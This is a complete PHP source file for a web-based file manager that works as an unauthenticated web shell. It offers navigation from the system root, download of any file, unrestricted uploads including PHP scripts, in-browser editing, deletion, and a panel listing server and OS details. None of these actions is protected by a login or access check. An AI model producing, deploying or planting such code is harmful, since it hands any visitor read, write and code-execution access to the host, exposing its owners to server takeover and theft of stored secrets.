<?php
session_start();

// Configuration
$root_path = '/'; // Set root path to system root for full navigation
$allowed_extensions = array('txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'log', 'htaccess');
$max_upload_size = 10 * 1024 * 1024; // 10MB

// Get current directory - allow full path navigation
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = rtrim($current_dir, '/');

// If current_dir is empty or just '/', set to root
if (empty($current_dir) || $current_dir === '.') {
    $current_dir = getcwd();
}

// Build the full current path
$current_path = $current_dir;

// Make sure path exists and is readable
if (!is_dir($current_path) || !is_readable($current_path)) {
    $current_path = getcwd();
    $current_dir = $current_path;
}

// Function to get parent directory
function getParentDir($current_path) {
    $parent = dirname($current_path);
    // Don't go above system root
    if ($parent === $current_path) {
        return null; // Already at root
    }
    return $parent;
}

// Handle actions
if ($_POST) {
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'upload':
            if (isset($_FILES['file'])) {
                $target_dir = $current_path . '/';
                $target_file = $target_dir . basename($_FILES['file']['name']);
                
                if ($_FILES['file']['size'] <= $max_upload_size) {
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                        $message = "File uploaded successfully!";
                    } else {
                        $error = "Upload failed!";
                    }
                } else {
                    $error = "File too large!";
                }
            }
            break;
            
        case 'create_folder':
            $folder_name = $_POST['folder_name'] ?? '';
            $folder_name = preg_replace('/[^a-zA-Z0-9\-_.]/', '', $folder_name); // Sanitize
            if ($folder_name && !file_exists($current_path . '/' . $folder_name)) {
                mkdir($current_path . '/' . $folder_name);
                $message = "Folder created successfully!";
            } else {
                $error = "Folder already exists or invalid name!";
            }
            break;
            
        case 'create_file':
            $file_name = $_POST['file_name'] ?? '';
            $file_name = preg_replace('/[^a-zA-Z0-9\-_.]/', '', $file_name); // Sanitize
            if ($file_name) {
                file_put_contents($current_path . '/' . $file_name, '');
                $message = "File created successfully!";
            }
            break;
            
        case 'rename':
            $old_name = $_POST['old_name'] ?? '';
            $new_name = $_POST['new_name'] ?? '';
            $new_name = preg_replace('/[^a-zA-Z0-9\-_.]/', '', $new_name); // Sanitize
            if ($old_name && $new_name && $old_name !== $new_name) {
                $old_path = $current_path . '/' . $old_name;
                $new_path = $current_path . '/' . $new_name;
                if (file_exists($old_path) && !file_exists($new_path)) {
                    rename($old_path, $new_path);
                    $message = "Renamed successfully!";
                } else {
                    $error = "Rename failed - file doesn't exist or target name already exists!";
                }
            }
            break;
            
        case 'delete':
            $file_name = $_POST['file_name'] ?? '';
            if ($file_name) {
                $file_path = $current_path . '/' . $file_name;
                if (file_exists($file_path)) {
                    if (is_dir($file_path)) {
                        if (rmdir($file_path)) {
                            $message = "Folder deleted successfully!";
                        } else {
                            $error = "Cannot delete folder - it may not be empty!";
                        }
                    } else {
                        if (unlink($file_path)) {
                            $message = "File deleted successfully!";
                        } else {
                            $error = "Cannot delete file!";
                        }
                    }
                } else {
                    $error = "File or folder not found!";
                }
            }
            break;
            
        case 'save_file':
            $file_name = $_POST['file_name'] ?? '';
            $content = $_POST['content'] ?? '';
            if ($file_name) {
                file_put_contents($current_path . '/' . $file_name, $content);
                $message = "File saved successfully!";
            }
            break;
    }
    
    // Redirect to prevent form resubmission
    $redirect_url = '?dir=' . urlencode($current_dir);
    header("Location: $redirect_url");
    exit;
}

// Handle download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    $file_path = $current_path . '/' . $file;
    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

// Get file content for editing
$edit_content = '';
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $edit_path = $current_path . '/' . $edit_file;
    if (file_exists($edit_path) && is_file($edit_path)) {
        $edit_content = htmlspecialchars(file_get_contents($edit_path));
    }
}

// Scan directory
$files = [];
$directories = [];
if (is_dir($current_path)) {
    $items = scandir($current_path);
    foreach ($items as $item) {
        if ($item != '.' && $item != '..') {
            $item_path = $current_path . '/' . $item;
            if (is_dir($item_path)) {
                $directories[] = $item;
            } else {
                $files[] = $item;
            }
        }
    }
    // Sort directories and files alphabetically
    sort($directories);
    sort($files);
}

// Helper functions
function formatBytes($size, $precision = 2) {
    if ($size == 0) return '0 B';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $base = log($size, 1024);
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $units[floor($base)];
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    switch ($ext) {
        case 'php': return '🐘';
        case 'html': case 'htm': return '🌐';
        case 'css': return '🎨';
        case 'js': return '⚡';
        case 'txt': return '📄';
        case 'json': return '📋';
        case 'xml': return '📰';
        case 'md': return '📝';
        case 'log': return '📊';
        case 'jpg': case 'jpeg': case 'png': case 'gif': return '🖼️';
        case 'pdf': return '📕';
        case 'zip': case 'rar': return '🗜️';
        default: return '📄';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced PHP File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
        }
        
        .nav-path {
            background: #f8f9fa;
            padding: 15px;
            border-bottom: 1px solid #dee2e6;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 5px;
        }
        
        .nav-path strong {
            margin-right: 10px;
        }
        
        .nav-path a {
            color: #007bff;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            transition: background 0.3s ease;
        }
        
        .nav-path a:hover {
            background: #e9ecef;
            text-decoration: none;
        }
        
        .nav-separator {
            color: #6c757d;
            margin: 0 2px;
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 250px 1fr;
            min-height: 600px;
        }
        
        .sidebar {
            background: #f8f9fa;
            border-right: 1px solid #dee2e6;
            padding: 20px;
        }
        
        .sidebar h3 {
            margin-bottom: 15px;
            color: #495057;
        }
        
        .content-area {
            padding: 20px;
        }
        
        .action-buttons {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 8px 16px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            font-size: 14px;
            transition: all 0.3s ease;
            display: inline-block;
        }
        
        .btn:hover {
            background: #0056b3;
            transform: translateY(-2px);
            color: white;
            text-decoration: none;
        }
        
        .btn-success { background: #28a745; }
        .btn-success:hover { background: #1e7e34; }
        
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        
        .btn-warning { background: #ffc107; color: #212529; }
        .btn-warning:hover { background: #e0a800; }
        
        .btn-info { background: #17a2b8; }
        .btn-info:hover { background: #138496; }
        
        .btn-secondary { background: #6c757d; }
        .btn-secondary:hover { background: #5a6268; }
        
        .btn-purple { background: #6f42c1; }
        .btn-purple:hover { background: #5a2d91; }
        
        .file-list {
            background: white;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            border-bottom: 1px solid #dee2e6;
            transition: background 0.3s ease;
        }
        
        .file-item:hover {
            background: #f8f9fa;
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-icon {
            font-size: 20px;
            margin-right: 12px;
            width: 30px;
            text-align: center;
        }
        
        .file-name {
            flex: 1;
            font-weight: 500;
        }
        
        .file-name a {
            color: #495057;
            text-decoration: none;
        }
        
        .file-name a:hover {
            color: #007bff;
        }
        
        .file-size {
            color: #6c757d;
            font-size: 0.9rem;
            margin-right: 10px;
            min-width: 60px;
        }
        
        .file-actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .file-actions .btn {
            padding: 4px 8px;
            font-size: 12px;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
        }
        
        .modal-content {
            background: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 500px;
        }
        
        .modal h3 {
            margin-bottom: 15px;
            color: #495057;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }
        
        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            font-size: 14px;
        }
        
        .form-group textarea {
            resize: vertical;
            min-height: 200px;
            font-family: monospace;
        }
        
        .close {
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .close:hover {
            color: #dc3545;
        }
        
        .message {
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 5px;
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border-color: #f5c6cb;
        }
        
        .server-info {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .server-info h4 {
            margin-bottom: 10px;
            color: #495057;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
        }
        
        .info-item {
            background: white;
            padding: 10px;
            border-radius: 5px;
            border-left: 4px solid #007bff;
        }
        
        .info-label {
            font-weight: bold;
            color: #495057;
            font-size: 0.9rem;
        }
        
        .info-value {
            color: #6c757d;
            font-size: 0.9rem;
            word-break: break-all;
        }
        
        .up-button {
            background: #28a745;
            margin-bottom: 10px;
        }
        
        .up-button:hover {
            background: #1e7e34;
        }
        
        @media (max-width: 768px) {
            .main-content {
                grid-template-columns: 1fr;
            }
            
            .sidebar {
                border-right: none;
                border-bottom: 1px solid #dee2e6;
            }
            
            .action-buttons {
                flex-direction: column;
            }
            
            .file-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }
            
            .file-actions {
                width: 100%;
                justify-content: flex-end;
            }
            
            .nav-path {
                flex-direction: column;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🗂️ Enhanced PHP File Manager</h1>
            <p>Navigate and manage your files with improved navigation</p>
        </div>
        
        <div class="nav-path">
            <strong>📁 Current Path:</strong>
            <a href="?dir=/">🏠 Root</a>
            <?php
            $path_parts = explode('/', trim($current_dir, '/'));
            $path_build = '';
            foreach ($path_parts as $part) {
                if ($part) {
                    $path_build .= '/' . $part;
                    echo '<span class="nav-separator">/</span>';
                    echo '<a href="?dir=' . urlencode($path_build) . '">' . htmlspecialchars($part) . '</a>';
                }
            }
            ?>
        </div>
        
        <div class="main-content">
            <div class="sidebar">
                <?php 
                $parent_dir = getParentDir($current_path);
                if ($parent_dir !== null): 
                ?>
                    <a href="?dir=<?php echo urlencode($parent_dir); ?>" class="btn up-button" style="width: 100%; text-align: center; margin-bottom: 20px;">
                        ⬆️ Go Up (..)
                    </a>
                <?php endif; ?>
                
                <h3>📊 Server Information</h3>
                <div class="server-info">
                    <div class="info-grid">
                        <div class="info-item">
                            <div class="info-label">Server:</div>
                            <div class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">System:</div>
                            <div class="info-value"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">PHP Version:</div>
                            <div class="info-value"><?php echo PHP_VERSION; ?></div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">User:</div>
                            <div class="info-value"><?php echo get_current_user(); ?></div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Directory:</div>
                            <div class="info-value"><?php echo htmlspecialchars($current_path); ?></div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Free Space:</div>
                            <div class="info-value"><?php echo formatBytes(disk_free_space($current_path)); ?></div>
                        </div>
                    </div>
                </div>
                
                <h3>🔧 Quick Actions</h3>
                <div style="display: flex; flex-direction: column; gap: 8px;">
                    <button class="btn btn-success" onclick="openModal('uploadModal')">📤 Upload File</button>
                    <button class="btn btn-success" onclick="openModal('createFolderModal')">📁 Create Folder</button>
                    <button class="btn btn-success" onclick="openModal('createFileModal')">📄 Create File</button>
                </div>
            </div>
            
            <div class="content-area">
                <?php if (isset($message)): ?>
                    <div class="message"><?php echo htmlspecialchars($message); ?></div>
                <?php endif; ?>
                
                <?php if (isset($error)): ?>
                    <div class="message error"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>
                
                <?php if (isset($_GET['edit'])): ?>
                    <div style="margin-bottom: 20px;">
                        <h3>✏️ Editing: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
                        <form method="post">
                            <input type="hidden" name="action" value="save_file">
                            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                            <div class="form-group">
                                <textarea name="content" placeholder="Enter file content..."><?php echo $edit_content; ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-success">💾 Save</button>
                            <a href="?<?php echo 'dir=' . urlencode($current_dir); ?>" class="btn btn-secondary">❌ Cancel</a>
                        </form>
                    </div>
                <?php else: ?>
                
                <div class="file-list">                   
                    <?php foreach ($directories as $dir): ?>
                        <div class="file-item">
                            <div class="file-icon">📁</div>
                            <div class="file-name">
                                <a href="?dir=<?php echo urlencode($current_dir ? $current_dir . '/' . $dir : '/' . $dir); ?>">
                                    <?php echo htmlspecialchars($dir); ?>
                                </a>
                            </div>
                            <div class="file-size">Folder</div>
                            <div class="file-actions">
                                <button class="btn btn-warning" onclick="renameItem('<?php echo htmlspecialchars($dir); ?>')">Rename</button>
                                <button class="btn btn-danger" onclick="deleteItem('<?php echo htmlspecialchars($dir); ?>')">Delete</button>
                            </div>
                        </div>
                    <?php endforeach; ?>
                    
                    <?php foreach ($files as $file): ?>
                        <?php 
                        $file_path = $current_path . '/' . $file;
                        $file_size = file_exists($file_path) ? filesize($file_path) : 0;
                        ?>
                        <div class="file-item">
                            <div class="file-icon"><?php echo getFileIcon($file); ?></div>
                            <div class="file-name">
                                <?php echo htmlspecialchars($file); ?>
                            </div>
                            <div class="file-size"><?php echo formatBytes($file_size); ?></div>
                            <div class="file-actions">
                                <a href="?download=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                                   class="btn btn-info">📥 Download</a>
                                <?php if (in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $allowed_extensions)): ?>
                                    <a href="?edit=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                                       class="btn btn-purple">✏️ Edit</a>
                                <?php endif; ?>
                                <button class="btn btn-warning" onclick="renameItem('<?php echo htmlspecialchars($file); ?>')">🔄 Rename</button>
                                <button class="btn btn-danger" onclick="deleteItem('<?php echo htmlspecialchars($file); ?>')">🗑️ Delete</button>
                            </div>
                        </div>
                    <?php endforeach; ?>
                    
                    <?php if (empty($directories) && empty($files)): ?>
                        <div class="file-item" style="justify-content: center; color: #6c757d;">
                            📂 Directory is empty
                        </div>
                    <?php endif; ?>
                </div>
                
                <?php endif; ?>
            </div>
        </div>
    </div>
    
    <!-- Upload Modal -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('uploadModal')">&times;</span>
            <h3>📤 Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <div class="form-group">
                    <label>Select File (Max: <?php echo formatBytes($max_upload_size); ?>):</label>
                    <input type="file" name="file" required>
                </div>
                <button type="submit" class="btn btn-success">📤 Upload</button>
                <button type="button" class="btn btn-secondary" onclick="closeModal('uploadModal')">❌ Cancel</button>
            </form>
        </div>
    </div>
    
    <!-- Create Folder Modal -->
    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('createFolderModal')">&times;</span>
            <h3>📁 Create Folder</h3>
            <form method="post">
                <input type="hidden" name="action" value="create_folder">
                <div class="form-group">
                    <label>Folder Name:</label>
                    <input type="text" name="folder_name" placeholder="my-folder" pattern="[a-zA-Z0-9\-_.]+" required>
                    <small style="color: #6c757d;">Only letters, numbers, hyphens, underscores, and dots allowed</small>
                </div>
                <button type="submit" class="btn btn-success">📁 Create</button>
                <button type="button" class="btn btn-secondary" onclick="closeModal('createFolderModal')">❌ Cancel</button>
            </form>
        </div>
    </div>
    
    <!-- Create File Modal -->
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('createFileModal')">&times;</span>
            <h3>📄 Create File</h3>
            <form method="post">
                <input type="hidden" name="action" value="create_file">
                <div class="form-group">
                    <label>File Name:</label>
                    <input type="text" name="file_name" placeholder="example.txt" pattern="[a-zA-Z0-9\-_.]+" required>
                    <small style="color: #6c757d;">Only letters, numbers, hyphens, underscores, and dots allowed</small>
                </div>
                <button type="submit" class="btn btn-success">📄 Create</button>
                <button type="button" class="btn btn-secondary" onclick="closeModal('createFileModal')">❌ Cancel</button>
            </form>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('renameModal')">&times;</span>
            <h3>✏️ Rename Item</h3>
            <form method="post" id="renameForm">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_name" id="oldName">
                <div class="form-group">
                    <label>New Name:</label>
                    <input type="text" name="new_name" id="newName" pattern="[a-zA-Z0-9\-_.]+" required>
                    <small style="color: #6c757d;">Only letters, numbers, hyphens, underscores, and dots allowed</small>
                </div>
                <button type="submit" class="btn btn-success">✏️ Rename</button>
                <button type="button" class="btn btn-secondary" onclick="closeModal('renameModal')">❌ Cancel</button>
            </form>
        </div>
    </div>
    
    <!-- Delete Modal -->
    <div id="deleteModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('deleteModal')">&times;</span>
            <h3>🗑️ Delete Confirmation</h3>
            <p>Are you sure you want to delete "<span id="deleteFileName"></span>"?</p>
            <p style="color: #dc3545; font-weight: bold; margin-top: 10px;">⚠️ This action cannot be undone!</p>
            <form method="post" id="deleteForm">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="file_name" id="deleteFileNameInput">
                <button type="submit" class="btn btn-danger">🗑️ Yes, Delete</button>
                <button type="button" class="btn btn-secondary" onclick="closeModal('deleteModal')">❌ Cancel</button>
            </form>
        </div>
    </div>
    
    <script>
        function openModal(modalId) {
            document.getElementById(modalId).style.display = 'block';
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        function renameItem(name) {
            document.getElementById('oldName').value = name;
            document.getElementById('newName').value = name;
            openModal('renameModal');
            // Focus on input field
            setTimeout(() => {
                document.getElementById('newName').focus();
                document.getElementById('newName').select();
            }, 100);
        }
        
        function deleteItem(name) {
            document.getElementById('deleteFileName').textContent = name;
            document.getElementById('deleteFileNameInput').value = name;
            openModal('deleteModal');
        }
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }
        
        // Handle keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                const modals = document.querySelectorAll('.modal');
                modals.forEach(modal => modal.style.display = 'none');
            }
            
            // Keyboard shortcuts for quick actions (when no modal is open)
            if (!document.querySelector('.modal[style*="block"]')) {
                if (e.ctrlKey && e.key === 'u') {
                    e.preventDefault();
                    openModal('uploadModal');
                } else if (e.ctrlKey && e.key === 'n') {
                    e.preventDefault();
                    openModal('createFileModal');
                } else if (e.ctrlKey && e.shiftKey && e.key === 'N') {
                    e.preventDefault();
                    openModal('createFolderModal');
                }
            }
        });
        
        // Form validation
        document.querySelectorAll('input[pattern]').forEach(input => {
            input.addEventListener('input', function() {
                const pattern = new RegExp(this.pattern);
                if (!pattern.test(this.value) && this.value.length > 0) {
                    this.setCustomValidity('Only letters, numbers, hyphens, underscores, and dots are allowed');
                } else {
                    this.setCustomValidity('');
                }
            });
        });
        
        // Auto-hide messages after 5 seconds
        document.addEventListener('DOMContentLoaded', function() {
            const messages = document.querySelectorAll('.message');
            messages.forEach(message => {
                setTimeout(() => {
                    message.style.transition = 'opacity 0.5s ease';
                    message.style.opacity = '0';
                    setTimeout(() => {
                        message.style.display = 'none';
                    }, 500);
                }, 5000);
            });
        });
        
        // Drag and drop file upload
        const contentArea = document.querySelector('.content-area');
        let dragCounter = 0;
        
        contentArea.addEventListener('dragenter', function(e) {
            e.preventDefault();
            dragCounter++;
            this.style.backgroundColor = '#f8f9fa';
            this.style.border = '2px dashed #007bff';
        });
        
        contentArea.addEventListener('dragleave', function(e) {
            e.preventDefault();
            dragCounter--;
            if (dragCounter <= 0) {
                this.style.backgroundColor = '';
                this.style.border = '';
            }
        });
        
        contentArea.addEventListener('dragover', function(e) {
            e.preventDefault();
        });
        
        contentArea.addEventListener('drop', function(e) {
            e.preventDefault();
            dragCounter = 0;
            this.style.backgroundColor = '';
            this.style.border = '';
            
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                const file = files[0];
                const fileInput = document.querySelector('input[name="file"]');
                const dataTransfer = new DataTransfer();
                dataTransfer.items.add(file);
                fileInput.files = dataTransfer.files;
                openModal('uploadModal');
            }
        });
        
        // Show loading indicator for form submissions
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function() {
                const submitBtn = this.querySelector('button[type="submit"]');
                if (submitBtn) {
                    submitBtn.innerHTML = '⏳ Processing...';
                    submitBtn.disabled = true;
                }
            });
        });
        
        // Keyboard shortcuts help
        console.log(`
🚀 Keyboard Shortcuts:
- Ctrl + U: Upload file
- Ctrl + N: Create new file
- Ctrl + Shift + N: Create new folder
- Escape: Close modals
- Drag & Drop files to upload
        `);
    </script>
</body>
</html>